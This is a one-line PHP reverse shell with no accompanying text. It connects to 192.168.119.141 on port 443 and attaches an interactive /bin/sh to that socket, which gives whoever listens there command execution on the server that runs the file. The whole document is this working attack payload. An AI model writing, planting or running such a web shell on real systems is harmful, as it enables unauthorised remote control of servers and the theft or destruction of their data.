<?php $sock = fsockopen("192.168.119.141",443); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
